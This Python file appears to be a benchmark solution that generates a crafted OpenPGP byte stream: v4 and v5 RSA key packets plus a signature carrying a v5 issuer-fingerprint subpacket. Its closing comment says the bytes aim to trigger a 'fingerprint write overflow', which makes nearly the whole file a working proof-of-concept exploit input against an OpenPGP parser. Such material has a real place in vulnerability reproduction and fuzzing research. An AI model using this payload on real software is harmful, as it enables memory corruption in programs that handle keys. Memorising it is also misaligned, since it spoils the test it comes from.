import os
import tarfile
from typing import Optional


def _pgp_new_format_packet(tag: int, body: bytes) -> bytes:
    if not (0 <= tag <= 63):
        raise ValueError("tag out of range")
    first = 0xC0 | (tag << 2)
    n = len(body)
    if n < 192:
        return bytes([first | 0]) + bytes([n]) + body
    if n <= 8383:
        n2 = n - 192
        return bytes([first | 1, (n2 >> 8) + 192, n2 & 0xFF]) + body
    return bytes([first | 2, 255]) + n.to_bytes(4, "big") + body


def _mpi_from_bytes(b: bytes) -> bytes:
    if not b:
        return b"\x00\x00"
    bitlen = (len(b) - 1) * 8 + (b[0].bit_length())
    return bitlen.to_bytes(2, "big") + b


def _subpkt_time(t: int) -> bytes:
    data = t.to_bytes(4, "big", signed=False)
    ln = 1 + len(data)
    if ln >= 192:
        raise ValueError("subpacket too large for one-octet len")
    return bytes([ln, 2]) + data


def _subpkt_issuer_fpr(keyver: int, fpr: bytes) -> bytes:
    data = bytes([keyver]) + fpr
    ln = 1 + len(data)
    if ln >= 192:
        raise ValueError("subpacket too large for one-octet len")
    return bytes([ln, 33]) + data


def _build_v4_public_key_packet_rsa_1024() -> bytes:
    n = b"\x80" + (b"\x00" * 127)  # 1024-bit, high bit set
    e = b"\x01\x00\x01"  # 65537
    mpis = _mpi_from_bytes(n) + _mpi_from_bytes(e)
    body = b"\x04" + b"\x00\x00\x00\x00" + b"\x01" + mpis
    return _pgp_new_format_packet(6, body)


def _build_v5_public_key_packet_rsa_1024() -> bytes:
    n = b"\x80" + (b"\x00" * 127)  # 1024-bit, high bit set
    e = b"\x01\x00\x01"  # 65537
    mpis = _mpi_from_bytes(n) + _mpi_from_bytes(e)
    body = b"\x05" + b"\x00\x00\x00\x00" + b"\x01" + len(mpis).to_bytes(4, "big") + mpis
    return _pgp_new_format_packet(6, body)


def _build_userid_packet(uid: bytes = b"test@example.com") -> bytes:
    return _pgp_new_format_packet(13, uid)


def _build_sig_packet_with_v5_issuer_fpr() -> bytes:
    # v4 signature packet structure
    # Use issuer fingerprint subpacket with key version 5 and 32-byte fingerprint.
    hashed = _subpkt_time(0) + _subpkt_issuer_fpr(5, b"\x00" * 32)
    hashed_len = len(hashed).to_bytes(2, "big")
    unhashed = b""
    unhashed_len = len(unhashed).to_bytes(2, "big")
    left16 = b"\x00\x00"

    # RSA signature MPI (dummy, syntactically valid)
    sig_s = b"\x80" + (b"\x00" * 127)  # 1024-bit
    sig_mpi = _mpi_from_bytes(sig_s)

    body = (
        b"\x04"          # version
        + b"\x13"        # signature type: positive certification
        + b"\x01"        # public-key algorithm: RSA
        + b"\x08"        # hash algorithm: SHA-256
        + hashed_len
        + hashed
        + unhashed_len
        + unhashed
        + left16
        + sig_mpi
    )
    return _pgp_new_format_packet(2, body)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Light touch: ensure src_path exists and is a tarball-ish file.
        # (Not strictly needed; kept minimal and robust.)
        if src_path and os.path.exists(src_path):
            try:
                with tarfile.open(src_path, "r:*"):
                    pass
            except Exception:
                pass

        v4_key = _build_v4_public_key_packet_rsa_1024()
        v5_key = _build_v5_public_key_packet_rsa_1024()
        uid = _build_userid_packet()
        sig = _build_sig_packet_with_v5_issuer_fpr()

        # Provide both a v4 transferable key (with v5 issuer fpr in signature subpacket)
        # and a v5 key block to maximize chances of triggering the fingerprint write overflow.
        return v4_key + uid + sig + v5_key + uid + sig